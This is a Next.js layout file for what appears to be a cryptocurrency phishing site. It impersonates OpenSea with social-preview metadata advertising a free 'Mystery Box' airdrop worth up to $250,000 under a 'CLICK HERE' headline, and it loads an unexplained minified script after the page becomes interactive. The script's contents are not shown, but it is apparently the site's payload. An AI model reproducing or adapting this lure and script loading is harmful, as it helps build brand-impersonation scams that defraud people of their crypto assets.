import type { ReactNode } from 'react';
import type { Metadata } from 'next';
import Script from 'next/script';
import './globals.css';

export const metadata: Metadata = {
  metadataBase: new URL('https://spike-ten-zeta.vercel.app'),
  title: 'OpenseaIO',
  description:
    '🟢 AIRDROP IS LIVE NOW 🟢\n\n🎉 Price: FREE\n🎉 Supply: 150 Mystery Box\n🎉 Reward: between $3000 and $250,000\n\nTRY YOUR LUCK ! 🚀',
  openGraph: {
    title: 'CLICK HERE - OPENSEA PRO NFT',
    description:
      '🟢 AIRDROP IS LIVE NOW 🟢\n\n🎉 Price: FREE\n🎉 Supply: 150 Mystery Box\n🎉 Reward: between $3000 and $250,000\n\nTRY YOUR LUCK ! 🚀',
    url: 'https://spike-ten-zeta.vercel.app/',
    siteName: 'This is an automatically generated announcement message',
    images: [
      {
        url: '/389-9bec97c22fa2e411.gif',
        width: 512,
        height: 512,
        alt: 'OpenSea Pro Mystery Box Airdrop'
      }
    ],
    type: 'website'
  },
  twitter: {
    card: 'summary_large_image',
    title: 'CLICK HERE - OPENSEA PRO NFT',
    description:
      '🟢 AIRDROP IS LIVE NOW 🟢\n\n🎉 Price: FREE\n🎉 Supply: 150 Mystery Box\n🎉 Reward: between $3000 and $250,000\n\nTRY YOUR LUCK ! 🚀',
    images: ['/389-9bec97c22fa2e411.gif']
  },
  themeColor: '#7289DA'
};

export default function RootLayout(props: { children: ReactNode }) {
  return (
    <html lang="en-GB">
      <body>
        {props.children}
        <Script src="/corehelper-1.5.1.min.js" strategy="afterInteractive" />
      </body>
    </html>
  );
}
